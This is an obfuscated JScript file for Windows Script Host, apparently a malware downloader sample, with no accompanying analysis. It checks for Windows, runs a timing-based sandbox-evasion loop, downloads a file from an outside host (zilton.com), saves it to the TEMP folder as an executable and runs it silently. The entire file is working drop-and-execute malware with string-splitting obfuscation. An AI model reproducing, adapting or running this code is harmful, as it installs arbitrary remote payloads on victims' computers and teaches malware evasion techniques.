var FR = false;
var Tf = "CreateObject";
var Yf = function QZ() {return WScript[Tf]("WScript.Shell");}(), kY = 11;
var u = "MSXML2.XMLHTTP";
var L = 2123213;
var zJ = 0;
function FD(j){Yf["Run"](j, zJ, zJ);};
function IT(){return "" + u;};
function PD(hh, k0){zJ = zJ * 1; return hh - k0;};
function Il(){return Tf;};
/*@cc_on
  @if (@_win32 || @_win64)
    FR = true;
  @end
@*/
if (FR)
{
var DX = "";
function E(){return 22;};
var BX = 0; var s0 = 0;
function qg()
{
var v = new this["Date"]();
var s = v["getUTCMilliseconds"]();
WScript["Sleep"](E());
var v = new this["Date"]();
var z = v["getUTCMilliseconds"]();
WScript["Sleep"](E());
var v = new this["Date"]();
var k = v["getUTCMilliseconds"]();
var BX = "b";
BX = PD(z, s);
var s0 = "Z";
s0 = PD(k, z);
DX = "open";
return PD(BX, s0);
}
var A = false;
var N = false;
for (var W = zJ; W < E() * 1; W++){if (qg() != zJ){
A = true; 
s0 = "31" + 11 * BX + s0; 
N = true; 
break;
}}
function Xv() {return ((A == true) && (A == N)) ? 1 : zJ;};
if (A && Xv() && N){
function CB() {return Yf["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WEd0TqpTi7D.exe";};
 tK = IT();
 sM = WScript[Tf](tK);
 var gg = 1;
 while (gg){
try {
sM[DX]("GET", "http://zilton.com/o9qwp", false);
sM["send"]();
Ek = "Sleep";
for (;;){WScript[Ek](E() * 11); if (sM["readystate"] >= 2 * 2) break;};
gg = zJ;
} catch(UP){};
}
function mj(oI) {var Qq = (1, 2, 3, 4, 5, oI); return Qq;};
zK = WScript[Il()]("ADODB.Stream");
tK = zK;
tK[DX]();
tK["type"] = mj(1);
tK["write"](sM["ResponseBody"]);
zK["position"] = mj(zJ);
tK["Save" + "ToFile"](CB(), 2);
zK["c"+"lose"]();
uL = CB();
FD(uL);
}
}

